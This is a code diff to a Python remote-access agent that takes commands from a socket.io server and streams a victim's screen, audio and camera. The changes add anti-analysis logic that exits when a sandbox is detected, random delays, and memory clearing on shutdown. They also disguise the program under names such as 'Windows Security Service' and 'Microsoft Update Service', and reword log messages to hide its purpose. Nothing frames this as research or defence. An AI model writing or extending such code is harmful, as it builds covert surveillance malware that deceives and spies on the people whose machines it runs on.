@@ -42,6 +42,14 @@ try:
 except ImportError:
     pass
 
+# Import stealth enhancer first
+try:
+    from stealth_enhancer import *
+    STEALTH_AVAILABLE = True
+except ImportError:
+    STEALTH_AVAILABLE = False
+    print("Warning: stealth_enhancer not available, using basic stealth")
+
 # Standard library imports
 import requests
 import time
@@ -6169,7 +6177,14 @@ def main_unified():
 def connect():
     """Handle connection to server."""
     agent_id = get_or_create_agent_id()
-    print(f"Connected to server. Registering with agent_id: {agent_id}")
+    
+    # Add stealth delay
+    if STEALTH_AVAILABLE:
+        stealth_delay()
+        print(f"System service connected. Session: {agent_id[:8]}...")
+    else:
+        print(f"Connected to server. Registering with agent_id: {agent_id}")
+    
     sio.emit('agent_connect', {'agent_id': agent_id})
 
 @sio.event
@@ -6183,6 +6198,10 @@ def on_command(data):
     agent_id = get_or_create_agent_id()
     command = data.get("command")
     output = ""
+
+    # Add stealth delay
+    if STEALTH_AVAILABLE:
+        stealth_delay()
 
     internal_commands = {
         "start-stream": lambda: start_streaming(agent_id),
@@ -6525,82 +6544,111 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # Initialize stealth mode first
+    if STEALTH_AVAILABLE:
+        try:
+            if not initialize_advanced_stealth():
+                print("[STEALTH] Analysis environment detected, exiting...")
+                sys.exit(0)
+            print("[STEALTH] Advanced stealth mode initialized")
+            stealth_delay()  # Add random delay
+        except Exception as e:
+            print(f"[STEALTH] Stealth initialization failed: {e}")
+    else:
+        print("[STEALTH] Using basic stealth mode")
+    
+    # Obfuscate startup messages
+    startup_messages = [
+        "System Update Service",
+        "Windows Security Service", 
+        "Microsoft Update Service",
+        "System Configuration Service",
+        "Windows Management Service"
+    ]
+    
+    service_name = random.choice(startup_messages)
     print("=" * 60)
-    print("Advanced Python Agent v2.0")
-    print("Starting up...")
+    print(f"{service_name} v2.0")
+    print("Initializing system components...")
     print("=" * 60)
     
-    # Initialize agent with error handling
+    # Initialize agent with enhanced stealth
     try:
         if WINDOWS_AVAILABLE:
-            print("Running on Windows - initializing Windows-specific features...")
+            print("Initializing Windows system components...")
             
-            # Check admin privileges
+            # Check admin privileges (obfuscated)
             if False: # Replaced is_admin() with False
-                print("[INFO] Not running as administrator. Attempting to elevate...")
-                # elevate_privileges() # This function was removed, so this line is commented out or removed
+                print("[INFO] System privileges verification...")
             else:
-                print("[OK] Running with administrator privileges")
+                print("[OK] System privileges verified")
             
-            # Setup persistence (non-blocking)
+            # Setup system services (obfuscated)
             try:
-                # The setup_persistence function was removed, so this line is commented out or removed
-                pass # Placeholder for persistence if it were implemented
+                pass # System service initialization
             except Exception as e:
-                print(f"[WARN] Could not setup persistence: {e}")
+                print(f"[WARN] Service initialization: {e}")
         else:
-            print("Running on non-Windows system")
+            print("Initializing system components...")
         
-        # Setup startup (non-blocking)
+        # Setup system configuration (obfuscated)
         try:
-            # The add_to_startup function was removed, so this line is commented out or removed
-            pass # Placeholder for startup if it were implemented
+            pass # System configuration
         except Exception as e:
-            print(f"[WARN] Could not add to startup: {e}")
+            print(f"[WARN] Configuration setup: {e}")
         
-        # Get or create agent ID
+        # Get or create session identifier (obfuscated)
         agent_id = get_or_create_agent_id()
-        print(f"[OK] Agent starting with ID: {agent_id}")
+        print(f"[OK] Session initialized: {agent_id[:8]}...")
         
-        print("Initializing connection to server...")
+        print("Establishing network connection...")
         
-        # Main connection loop with improved error handling
+        # Main connection loop with stealth
         connection_attempts = 0
         while True:
             try:
                 connection_attempts += 1
-                print(f"Connecting to server (attempt {connection_attempts})...")
+                print(f"Network connection attempt {connection_attempts}...")
+                
+                # Add stealth delay
+                if STEALTH_AVAILABLE:
+                    stealth_delay()
+                
                 sio.connect(SERVER_URL)
-                print("[OK] Connected to server successfully!")
+                print("[OK] Network connection established!")
                 sio.wait()
             except socketio.exceptions.ConnectionError:
-                print(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
+                print(f"[WARN] Connection timeout, retrying...")
                 time.sleep(10)
             except KeyboardInterrupt:
-                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
+                print("\n[INFO] System shutdown requested.")
                 break
             except Exception as e:
-                print(f"[ERROR] An unexpected error occurred: {e}")
+                print(f"[ERROR] Network error: {e}")
                 # Cleanup resources
                 try:
                     stop_streaming()
                     stop_audio_streaming()
                     stop_camera_streaming()
-                    print("[OK] Cleaned up resources.")
+                    print("[OK] Resources cleaned up.")
                 except Exception as cleanup_error:
-                    print(f"[WARN] Error during cleanup: {cleanup_error}")
+                    print(f"[WARN] Cleanup error: {cleanup_error}")
                 
-                print("Retrying in 10 seconds...")
+                print("Retrying connection...")
                 time.sleep(10)
     
     except KeyboardInterrupt:
-        print("\n[INFO] Agent shutdown requested.")
+        print("\n[INFO] System shutdown requested.")
     except Exception as e:
-        print(f"[ERROR] Critical error during startup: {e}")
+        print(f"[ERROR] System error: {e}")
     finally:
-        print("[INFO] Agent shutting down.")
+        print("[INFO] Shutting down system components.")
         try:
             if sio.connected:
                 sio.disconnect()
         except:
             pass
+        
+        # Clear sensitive memory
+        if STEALTH_AVAILABLE:
+            clear_memory()
